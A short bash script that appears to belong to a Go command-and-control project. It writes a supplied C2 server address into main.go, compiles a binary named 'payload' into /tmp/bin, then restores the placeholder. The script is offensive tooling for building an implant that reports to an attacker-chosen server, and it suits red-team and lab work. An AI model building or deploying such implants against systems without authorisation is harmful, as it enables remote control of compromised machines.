#!/bin/bash


if [ -d "/tmp/bin" ] 
then
    echo "Directory /tmp/bin exists. skipping" 
else
    mkdir /tmp/bin
fi
sed -i "s/goc2_server/https:\/\/$1/" main.go
go build -o /tmp/bin/payload
sed -i "s/https:\/\/$1/goc2_server/" main.go
echo "payload located at /tmp/bin/payload c2:$1"